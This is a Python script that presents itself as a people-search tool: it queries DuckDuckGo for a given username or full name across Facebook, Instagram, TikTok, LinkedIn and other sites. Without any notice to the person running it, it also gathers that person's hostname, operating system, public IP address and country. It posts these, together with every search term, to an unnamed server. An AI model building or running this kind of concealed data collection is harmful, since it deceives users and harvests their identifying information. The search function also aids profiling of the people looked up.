import platform
import time
import requests
from server_requests import post_log  # دالة بسيطة لإرسال البيانات للسيرفر
from server_requests import duckduckgo_search_links  # استخدم النسخة من server.py
from colorama import Fore, init, Style

init(autoreset=True)

def main():
    username = platform.node()
    os_name = platform.system() + " " + platform.release()
    try:
        ip = requests.get("https://api64.ipify.org?format=json", timeout=15).json()["ip"]
        country = requests.get(f"https://ipapi.co/{ip}/json/", timeout=15).json().get("country_name", "Unknown")
    except:
        ip, country = "0.0.0.0", "Unknown"

    while True:
        identifier = input(Fore.CYAN + "[?] Enter username or firstname and lastname: " + Style.RESET_ALL).strip()
        if not identifier:
            continue

        # إرسال البيانات فقط للسيرفر
        post_log({
            "username": username,
            "os": os_name,
            "country": country,
            "ip": ip,
            "search": identifier
        })

        print(Fore.MAGENTA + "\n🔍 Searching...\n")
        for platform_name, domain in {
            "Facebook":"facebook.com", "Instagram":"instagram.com", "Youtube":"youtube.com",
            "TikTok":"tiktok.com", "Snapchat":"snapchat.com", "Reddit":"reddit.com",
            "Twitter":"twitter.com", "Pinterest":"pinterest.com", "LinkedIn":"linkedin.com"
        }.items():
            print(Fore.YELLOW + f"🔍 Searching {platform_name}...")
            links = duckduckgo_search_links(identifier, site=domain, num_results=10)
            count = len(links)
            print(Fore.GREEN + f"✅ {count}/10 results:")
            if links:
                for l in links:
                    print(Fore.CYAN + f"   {l}")
            else:
                print(Fore.RED + "❌ No results found.")
            time.sleep(3)  # تأخير لتجنب 202

        again = input(Fore.MAGENTA + "\n[?] Search again? (yes/no): ").strip().lower()
        if again not in ("yes","y"):
            break

if __name__ == "__main__":
    main()
